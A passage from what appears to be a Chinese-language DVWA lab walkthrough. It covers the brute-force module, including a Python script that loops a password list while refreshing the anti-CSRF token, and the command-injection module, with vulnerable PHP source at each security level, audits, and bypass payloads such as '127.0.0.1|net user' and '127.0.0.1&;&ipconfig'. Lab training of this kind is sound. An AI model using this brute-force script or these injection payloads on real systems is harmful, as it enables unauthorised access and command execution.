class="string">'Host'</span>: <span class="string">'dvwa.com'</span>,</span><br><span class="line">    <span class="string">'Upgrade-Insecure-Requests'</span>: 1,</span><br><span class="line">    <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.104 Safari/537.36 Core/1.53.4549.400 QQBrowser/9.7.12900.400'</span>,</span><br><span class="line">    <span class="string">'Accept'</span>: <span class="string">'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'</span>,</span><br><span class="line">    <span class="string">'Accept-Encoding'</span>: <span class="string">'gzip, deflate'</span>,</span><br><span class="line">    <span class="string">'Accept-Language'</span>: <span class="string">'zh-CN,zh;q=0.8'</span>,</span><br><span class="line">    <span class="string">'Cookie'</span>: <span class="string">'security=high; PHPSESSID=9uqri734rutq7rpibecc6quud1'</span>,</span><br><span class="line">    <span class="string">'Connection'</span>: <span class="string">'close'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">##获取页面的token值</span></span><br><span class="line">def get_usertoken(indexurl,header):</span><br><span class="line">    reg = request.Request(indexurl,headers=header)</span><br><span class="line">    response = request.urlopen(reg)</span><br><span class="line">    the_page = response.read()</span><br><span class="line">    <span class="built_in">print</span>(str(response.getcode())+<span class="string">' '</span>+str(len(the_page)))</span><br><span class="line">    soup = BeautifulSoup(the_page, <span class="string">"html.parser"</span>)</span><br><span class="line">    user_token = soup.find(<span class="string">'input'</span>,<span class="built_in">type</span>=<span class="string">"hidden"</span>)[<span class="string">'value'</span>]</span><br><span class="line">    <span class="built_in">return</span> user_token</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">##获取token的url</span></span><br><span class="line">indexurl = <span class="string">'http://dvwa.com/DVWA/vulnerabilities/brute/'</span></span><br><span class="line"><span class="comment">##获取token</span></span><br><span class="line">user_token = get_usertoken(indexurl,header)</span><br><span class="line"></span><br><span class="line">with open(<span class="string">'password.txt'</span>) as f:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">        login_url = <span class="string">"http://dvwa.com/DVWA/vulnerabilities/brute/?username=admin&amp;password=&#123;&#125;&amp;Login=Login&amp;user_token=&#123;&#125;"</span>.format(line.strip(), user_token)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">'admin'</span>, line.strip(),end=<span class="string">' '</span>)</span><br><span class="line">        user_token = get_usertoken(login_url, header)</span><br></pre></td></tr></table></figure>
<p>效果如下图:</p>
<p><img src="bruce02.png" alt=""></p>
<h3 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a>Impossible</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php    </span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_POST</span>[<span class="string">'Login'</span>]))&#123;</span><br><span class="line">//CheckAnti-CSRFtoken</span><br><span class="line">checkToken(<span class="variable">$_REQUEST</span>[<span class="string">'user_token'</span>],<span class="variable">$_SESSION</span>[<span class="string">'session_token'</span>],<span class="string">'index.php'</span>);</span><br><span class="line"></span><br><span class="line">//Sanitiseusernameinput</span><br><span class="line"><span class="variable">$user</span>=<span class="variable">$_POST</span>[<span class="string">'username'</span>];</span><br><span class="line"><span class="variable">$user</span>=stripslashes(<span class="variable">$user</span>);</span><br><span class="line"><span class="variable">$user</span>=mysql_real_escape_string(<span class="variable">$user</span>);</span><br><span class="line"></span><br><span class="line">//Sanitisepasswordinput</span><br><span class="line"><span class="variable">$pass</span>=<span class="variable">$_POST</span>[<span class="string">'password'</span>];</span><br><span class="line"><span class="variable">$pass</span>=stripslashes(<span class="variable">$pass</span>);</span><br><span class="line"><span class="variable">$pass</span>=mysql_real_escape_string(<span class="variable">$pass</span>);</span><br><span class="line"><span class="variable">$pass</span>=md5(<span class="variable">$pass</span>);</span><br><span class="line"></span><br><span class="line">//Defaultvalues</span><br><span class="line"><span class="variable">$total_failed_login</span>=3;</span><br><span class="line"><span class="variable">$lockout_time</span>=15;</span><br><span class="line"><span class="variable">$account_locked</span>=<span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">//Checkthedatabase(Checkuserinformation)</span><br><span class="line"><span class="variable">$data</span>=<span class="variable">$db</span>-&gt;prepare(<span class="string">'SELECTfailed_login,last_loginFROMusersWHEREuser=(:user)LIMIT1;'</span>);</span><br><span class="line"><span class="variable">$data</span>-&gt;bindParam(<span class="string">':user'</span>,<span class="variable">$user</span>,PDO::PARAM_STR);</span><br><span class="line"><span class="variable">$data</span>-&gt;execute();</span><br><span class="line"><span class="variable">$row</span>=<span class="variable">$data</span>-&gt;fetch();</span><br><span class="line"></span><br><span class="line">//Checktoseeiftheuserhasbeenlockedout.</span><br><span class="line"><span class="keyword">if</span>((<span class="variable">$data</span>-&gt;rowCount()==1)&amp;&amp;(<span class="variable">$row</span>[<span class="string">'failed_login'</span>]&gt;=<span class="variable">$total_failed_login</span>))&#123;</span><br><span class="line">//Userlockedout.Note,usingthismethodwouldallowforuserenumeration!</span><br><span class="line">//<span class="built_in">echo</span><span class="string">"&lt;pre&gt;&lt;br/&gt;Thisaccounthasbeenlockedduetotoomanyincorrectlogins.&lt;/pre&gt;"</span>;</span><br><span class="line"></span><br><span class="line">//Calculatewhentheuserwouldbeallowedtologinagain</span><br><span class="line"><span class="variable">$last_login</span>=<span class="variable">$row</span>[<span class="string">'last_login'</span>];</span><br><span class="line"><span class="variable">$last_login</span>=strtotime(<span class="variable">$last_login</span>);</span><br><span class="line"><span class="variable">$timeout</span>=strtotime(<span class="string">"&#123;<span class="variable">$last_login</span>&#125;+&#123;<span class="variable">$lockout_time</span>&#125;minutes"</span>);</span><br><span class="line"><span class="variable">$timenow</span>=strtotime(<span class="string">"now"</span>);</span><br><span class="line"></span><br><span class="line">//Checktoseeifenoughtimehaspassed,ifithasn<span class="string">'tlockedtheaccount</span></span><br><span class="line"><span class="string">if($timenow&gt;$timeout)</span></span><br><span class="line"><span class="string">$account_locked=true;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">//Checkthedatabase(ifusernamematchesthepassword)</span></span><br><span class="line"><span class="string">$data=$db-&gt;prepare('</span>SELECT*FROMusersWHEREuser=(:user)ANDpassword=(:password)LIMIT1;<span class="string">');</span></span><br><span class="line"><span class="string">$data-&gt;bindParam('</span>:user<span class="string">',$user,PDO::PARAM_STR);</span></span><br><span class="line"><span class="string">$data-&gt;bindParam('</span>:password<span class="string">',$pass,PDO::PARAM_STR);</span></span><br><span class="line"><span class="string">$data-&gt;execute();</span></span><br><span class="line"><span class="string">$row=$data-&gt;fetch();</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">//Ifitsavalidlogin...</span></span><br><span class="line"><span class="string">if(($data-&gt;rowCount()==1)&amp;&amp;($account_locked==false))&#123;</span></span><br><span class="line"><span class="string">//Getusersdetails</span></span><br><span class="line"><span class="string">$avatar=$row['</span>avatar<span class="string">'];</span></span><br><span class="line"><span class="string">$failed_login=$row['</span>failed_login<span class="string">'];</span></span><br><span class="line"><span class="string">$last_login=$row['</span>last_login<span class="string">'];</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">//Loginsuccessful</span></span><br><span class="line"><span class="string">echo"&lt;p&gt;Welcometothepasswordprotectedarea&lt;em&gt;&#123;$user&#125;&lt;/em&gt;&lt;/p&gt;";</span></span><br><span class="line"><span class="string">echo"&lt;imgsrc="&#123;$avatar&#125;"/&gt;";</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">//Hadtheaccountbeenlockedoutsincelastlogin?</span></span><br><span class="line"><span class="string">if($failed_login&gt;=$total_failed_login)&#123;</span></span><br><span class="line"><span class="string">echo"&lt;p&gt;&lt;em&gt;Warning&lt;/em&gt;:Someonemightofbeenbruteforcingyouraccount.&lt;/p&gt;";</span></span><br><span class="line"><span class="string">echo"&lt;p&gt;Numberofloginattempts:&lt;em&gt;&#123;$failed_login&#125;&lt;/em&gt;.&lt;br/&gt;Lastloginattemptwasat:&lt;em&gt;$&#123;last_login&#125;&lt;/em&gt;.&lt;/p&gt;";</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">//Resetbadlogincount</span></span><br><span class="line"><span class="string">$data=$db-&gt;prepare('</span>UPDATEusersSETfailed_login=<span class="string">"0"</span>WHEREuser=(:user)LIMIT1;<span class="string">');</span></span><br><span class="line"><span class="string">$data-&gt;bindParam('</span>:user<span class="string">',$user,PDO::PARAM_STR);</span></span><br><span class="line"><span class="string">$data-&gt;execute();</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">else&#123;</span></span><br><span class="line"><span class="string">//Loginfailed</span></span><br><span class="line"><span class="string">sleep(rand(2,4));</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">//Givetheusersomefeedback</span></span><br><span class="line"><span class="string">echo"&lt;pre&gt;&lt;br/&gt;Usernameand/orpasswordincorrect.&lt;br/&gt;&lt;br/&gt;Alternative,theaccounthasbeenlockedbecauseoftoomanyfailedlogins.&lt;br/&gt;Ifthisisthecase,&lt;em&gt;pleasetryagainin&#123;$lockout_time&#125;minutes&lt;/em&gt;.&lt;/pre&gt;";</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">//Updatebadlogincount</span></span><br><span class="line"><span class="string">$data=$db-&gt;prepare('</span>UPDATEusersSETfailed_login=(failed_login+1)WHEREuser=(:user)LIMIT1;<span class="string">');</span></span><br><span class="line"><span class="string">$data-&gt;bindParam('</span>:user<span class="string">',$user,PDO::PARAM_STR);</span></span><br><span class="line"><span class="string">$data-&gt;execute();</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">//Setthelastlogintime</span></span><br><span class="line"><span class="string">$data=$db-&gt;prepare('</span>UPDATEusersSETlast_login=now()WHEREuser=(:user)LIMIT1;<span class="string">');</span></span><br><span class="line"><span class="string">$data-&gt;bindParam('</span>:user<span class="string">',$user,PDO::PARAM_STR);</span></span><br><span class="line"><span class="string">$data-&gt;execute();</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">//GenerateAnti-CSRFtoken</span></span><br><span class="line"><span class="string">generateSessionToken();</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="审计-3"><a href="#审计-3" class="headerlink" title="审计:"></a>审计:</h4><p>上面代码加入了可靠的防爆破机制，当检测到频繁的错误的登陆后，系统会将账户锁定，爆破就无法继续，同时采用了更为安全的PDO（PHP Data Object）机制防御sql注入，这是因为不能使用PDO扩展本身执行任何数据库操作，而sql注入的关键就是通过破坏sql语句结构执行恶意的sql命令。</p>
<h2 id="Command-Injection"><a href="#Command-Injection" class="headerlink" title="Command Injection"></a>Command Injection</h2><p>Command Injection，即命令注入，是指通过提交恶意构造的参数破坏命令语句结构，从而达到执行恶意命令的目的。PHP命令注入攻击漏洞是PHP应用程序中常见的脚本漏洞之一，国内著名的Web应用程序Discuz!、DedeCMS等都曾经存在过该类型漏洞。</p>
<h3 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( isset( <span class="variable">$_POST</span>[ <span class="string">'Submit'</span> ]  ) ) &#123; </span><br><span class="line">    // Get input </span><br><span class="line">    <span class="variable">$target</span> = <span class="variable">$_REQUEST</span>[ <span class="string">'ip'</span> ]; </span><br><span class="line"></span><br><span class="line">    // Determine OS and execute the ping <span class="built_in">command</span>. </span><br><span class="line">    <span class="keyword">if</span>( stristr( php_uname( <span class="string">'s'</span> ), <span class="string">'Windows NT'</span> ) ) &#123; </span><br><span class="line">        // Windows </span><br><span class="line">        <span class="variable">$cmd</span> = shell_exec( <span class="string">'ping  '</span> . <span class="variable">$target</span> ); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123; </span><br><span class="line">        // *nix </span><br><span class="line">        <span class="variable">$cmd</span> = shell_exec( <span class="string">'ping  -c 4 '</span> . <span class="variable">$target</span> ); </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    // Feedback <span class="keyword">for</span> the end user </span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"&lt;pre&gt;&#123;<span class="variable">$cmd</span>&#125;&lt;/pre&gt;"</span>; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h4 id="审计-4"><a href="#审计-4" class="headerlink" title="审计:"></a>审计:</h4><p>php函数：</p>
<ul>
<li><p>stristr(string,search,before_search)<br>stristr函数搜索字符串在另一字符串中的第一次出现，返回字符串的剩余部分（从匹配点），如果未找到所搜索的字符串，则返回 FALSE。参数string规定被搜索的字符串，参数search规定要搜索的字符串（如果该参数是数字，则搜索匹配该数字对应的 ASCII 值的字符），可选参数before_true为布尔型，默认为“false” ，如果设置为 “true”，函数将返回 search 参数第一次出现之前的字符串部分。</p>
</li>
<li><p>php_uname(mode)<br>php_uname — 返回运行 PHP 的系统的有关信息。<br>原型：string php_uname ([ string $mode = “a” ] )。返回运行php的操作系统的相关描述，和 phpinfo() 最顶端上输出的是同一个字符串。 如果仅仅要获取操作系统的名称。可以考虑使用常量 PHP_OS，不过要注意该常量会包含 PHP 构建（built）时的操作系统名。</p>
</li>
</ul>
<h4 id="漏洞利用-3"><a href="#漏洞利用-3" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>window和linux系统都可以用&amp;&amp;来执行多条命令</p>
<ul>
<li>127.0.0.1&amp;&amp;net user<br><img src="cinjection02.png" alt=""></li>
</ul>
<h3 id="Medium-1"><a href="#Medium-1" class="headerlink" title="Medium"></a>Medium</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"><span class="keyword">if</span>( isset( <span class="variable">$_POST</span>[ <span class="string">'Submit'</span> ]  ) ) &#123; </span><br><span class="line">    // Get input </span><br><span class="line">    <span class="variable">$target</span> = <span class="variable">$_REQUEST</span>[ <span class="string">'ip'</span> ]; </span><br><span class="line">    // Set blacklist </span><br><span class="line">    <span class="variable">$substitutions</span> = array( </span><br><span class="line">        <span class="string">'&amp;&amp;'</span> =&gt; <span class="string">''</span>, </span><br><span class="line">        <span class="string">';'</span>  =&gt; <span class="string">''</span>,    </span><br><span class="line">    );     </span><br><span class="line">    // Remove any of the charactars <span class="keyword">in</span> the array (blacklist).     </span><br><span class="line">    <span class="variable">$target</span> = str_replace( array_keys( <span class="variable">$substitutions</span> ), <span class="variable">$substitutions</span>, <span class="variable">$target</span> );     </span><br><span class="line">    // Determine OS and execute the ping <span class="built_in">command</span>.     </span><br><span class="line">    <span class="keyword">if</span>( stristr( php_uname( <span class="string">'s'</span> ), <span class="string">'Windows NT'</span> ) ) &#123;    </span><br><span class="line">        // Windows     </span><br><span class="line">        <span class="variable">$cmd</span> = shell_exec( <span class="string">'ping  '</span> . <span class="variable">$target</span> );    </span><br><span class="line">    &#125;     </span><br><span class="line">    <span class="keyword">else</span> &#123;     </span><br><span class="line">        // *nix     </span><br><span class="line">        <span class="variable">$cmd</span> = shell_exec( <span class="string">'ping  -c 4 '</span> . <span class="variable">$target</span> );    </span><br><span class="line">    &#125;   </span><br><span class="line">    // Feedback <span class="keyword">for</span> the end user   </span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"&lt;pre&gt;&#123;<span class="variable">$cmd</span>&#125;&lt;/pre&gt;"</span>;    </span><br><span class="line">&#125;    </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h4 id="审计-5"><a href="#审计-5" class="headerlink" title="审计:"></a>审计:</h4><p>对输入的参数做了黑名单限制，即把”&amp;&amp;” 、”;”删除，因此依旧存在依旧安全漏洞</p>
<h4 id="漏洞利用-4"><a href="#漏洞利用-4" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>由于把&amp;&amp;加入了黑名单，我们可以使用&amp;，两者的区别是前者第一条语句返回为真，第二个语句才会执行，后者为无论第一条语句如何，第二条语句都会执行</p>
<ul>
<li>127.0.0.1&amp;net user<br><img src="cinjection03.png" alt=""></li>
</ul>
<p>str_replace把”&amp;&amp;” 、”;”替换为空字符，因此可以采用以下方式绕过：;直接回替换为空字符串，整条语句会变成127.0.0.1&amp;&amp; ipconfig</p>
<ul>
<li>127.0.0.1&amp;;&amp;ipconfig<br><img src="cinjection05.png" alt=""></li>
</ul>
<h3 id="High-1"><a href="#High-1" class="headerlink" title="High"></a>High</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"><span class="keyword">if</span>( isset( <span class="variable">$_POST</span>[ <span class="string">'Submit'</span> ]  ) ) &#123; </span><br><span class="line"></span><br><span class="line">    // Get input </span><br><span class="line"></span><br><span class="line">    <span class="variable">$target</span> = trim(<span class="variable">$_REQUEST</span>[ <span class="string">'ip'</span> ]); </span><br><span class="line"></span><br><span class="line">    // Set blacklist </span><br><span class="line"></span><br><span class="line">    <span class="variable">$substitutions</span> = array( </span><br><span class="line"></span><br><span class="line">        <span class="string">'&amp;'</span>  =&gt; <span class="string">''</span>, </span><br><span class="line"></span><br><span class="line">        <span class="string">';'</span>  =&gt; <span class="string">''</span>, </span><br><span class="line"></span><br><span class="line">        <span class="string">'|  '</span> =&gt; <span class="string">''</span>, </span><br><span class="line"></span><br><span class="line">        <span class="string">'-'</span>  =&gt; <span class="string">''</span>, </span><br><span class="line"></span><br><span class="line">        <span class="string">'$'</span>  =&gt; <span class="string">''</span>, </span><br><span class="line"></span><br><span class="line">        <span class="string">'('</span>  =&gt; <span class="string">''</span>, </span><br><span class="line"></span><br><span class="line">        <span class="string">')'</span>  =&gt; <span class="string">''</span>, </span><br><span class="line"></span><br><span class="line">        <span class="string">'`'</span>  =&gt; <span class="string">''</span>, </span><br><span class="line"></span><br><span class="line">        <span class="string">'||'</span> =&gt; <span class="string">''</span>, </span><br><span class="line"></span><br><span class="line">    ); </span><br><span class="line"></span><br><span class="line">    // Remove any of the charactars <span class="keyword">in</span> the array (blacklist). </span><br><span class="line"></span><br><span class="line">    <span class="variable">$target</span> = str_replace( array_keys( <span class="variable">$substitutions</span> ), <span class="variable">$substitutions</span>, <span class="variable">$target</span> ); </span><br><span class="line"></span><br><span class="line">    // Determine OS and execute the ping <span class="built_in">command</span>. </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( stristr( php_uname( <span class="string">'s'</span> ), <span class="string">'Windows NT'</span> ) ) &#123; </span><br><span class="line"></span><br><span class="line">        // Windows </span><br><span class="line"></span><br><span class="line">        <span class="variable">$cmd</span> = shell_exec( <span class="string">'ping  '</span> . <span class="variable">$target</span> ); </span><br><span class="line"></span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> &#123; </span><br><span class="line"></span><br><span class="line">        // *nix </span><br><span class="line"></span><br><span class="line">        <span class="variable">$cmd</span> = shell_exec( <span class="string">'ping  -c 4 '</span> . <span class="variable">$target</span> ); </span><br><span class="line"></span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    // Feedback <span class="keyword">for</span> the end user </span><br><span class="line"></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"&lt;pre&gt;&#123;<span class="variable">$cmd</span>&#125;&lt;/pre&gt;"</span>; </span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h4 id="审计-6"><a href="#审计-6" class="headerlink" title="审计"></a>审计</h4><p>看起来，黑名单都把特殊字符限制了，但是聪明的一定会注意到”| ”有一个空格，因此我们可以使用这个绕过<br>“|”是管道符，表示将Command 1的输出作为Command 2的输入，并且只打印Command 2执行的结果。</p>
<h4 id="漏洞利用-5"><a href="#漏洞利用-5" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><ul>
<li>127.0.0.1|net user<br><img src="cinjection06.png" alt=""></li>
</ul>
<h3 id="Impossible-1"><a href="#Impossible-1" class="headerlink" title="Impossible"></a>Impossible</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( isset( <span class="variable">$_POST</span>[ <span class="string">'Submit'</span> ]  ) ) &#123; </span><br><span class="line"></span><br><span class="line">    // Check Anti-CSRF token </span><br><span class="line"></span><br><span class="line">    checkToken( <span class="variable">$_REQUEST</span>[ <span class="string">'user_token'</span> ], <span class="variable">$_SESSION</span>[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> ); </span><br><span class="line"></span><br><span class="line">    // Get input </span><br><span class="line"></span><br><span class="line">    <span class="variable">$target</span> = <span class="variable">$_REQUEST</span>[ <span class="string">'ip'</span> ]; </span><br><span class="line"></span><br><span class="line">    <span class="variable">$target</span> = stripslashes( <span class="variable">$target</span> ); </span><br><span class="line"></span><br><span class="line">    // Split the IP into 4 octects </span><br><span class="line"></span><br><span class="line">    <span class="variable">$octet</span> = explode( <span class="string">"."</span>, <span class="variable">$target</span> ); </span><br><span class="line"></span><br><span class="line">    // Check IF each octet is an <span class="built_in">integer</span> </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( ( is_numeric( <span class="variable">$octet</span>[0] ) ) &amp;&amp; ( is_numeric( <span class="variable">$octet</span>[1] ) ) &amp;&amp; ( is_numeric( <span class="variable">$octet</span>[2] ) ) &amp;&amp; ( is_numeric( <span class="variable">$octet</span>[3] ) ) &amp;&amp; ( sizeof( <span class="variable">$octet</span> ) == 4 ) ) &#123; </span><br><span class="line"></span><br><span class="line">        // If all 4 octets are int<span class="string">'s put the IP back together. </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        $target = $octet[0] . '</span>.<span class="string">' . $octet[1] . '</span>.<span class="string">' . $octet[2] . '</span>.<span class="string">' . $octet[3]; </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        // Determine OS and execute the ping command. </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        if( stristr( php_uname( '</span>s<span class="string">' ), '</span>Windows NT<span class="string">' ) ) &#123; </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            // Windows </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            $cmd = shell_exec( '</span>ping  <span class="string">' . $target ); </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        &#125; </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        else &#123; </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            // *nix </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            $cmd = shell_exec( '</span>ping  -c 4 <span class="string">' . $target ); </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        &#125; </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        // Feedback for the end user </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        echo "&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;"; </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &#125; </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    else &#123; </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        // Ops. Let the user name theres a mistake </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        echo 